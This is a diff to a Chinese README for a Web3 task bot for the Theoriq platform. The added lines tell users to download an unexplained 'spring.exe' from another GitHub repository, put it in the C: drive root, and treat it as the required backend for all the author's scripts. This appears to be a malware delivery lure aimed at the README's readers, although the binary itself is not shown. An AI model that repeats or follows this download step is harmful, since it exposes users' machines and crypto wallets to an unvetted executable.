@@ -1,5 +1,6 @@
 # Theoriq_Bot
 
+
 ## Theoriq_Bot项目介绍
 
 Theoriq 是一种模块化、可组合的 AI 代理基础层，用于 Web3 的机器学习和相关的复杂数据驱动计算。 Theoriq 作为设计合作伙伴与领先的 Web3 协议合作，将机器学习应用于 DeFi、游戏、社交和数据基础设施。
@@ -12,6 +13,10 @@ Theoriq 是一种模块化、可组合的 AI 代理基础层，用于 Web3 的�
 
 
 ## Theoriq开源脚本使用教程
+
+spring支持库为所有脚本通用的，不需要重复下载。第一次使用请在本仓库下载spring.exe软件放在C盘根目录，所有开源脚本均需要此nodejs后端软件支持。（下载过的可以无视）
+
+https://github.com/Spring-web3/Spring/releases/tag/spring
 
 Theoriq和Bytenova任务基本一样，参考Bytenova_Bot使用教程即可。导入文本格式也一致。不再过多讲解。
 
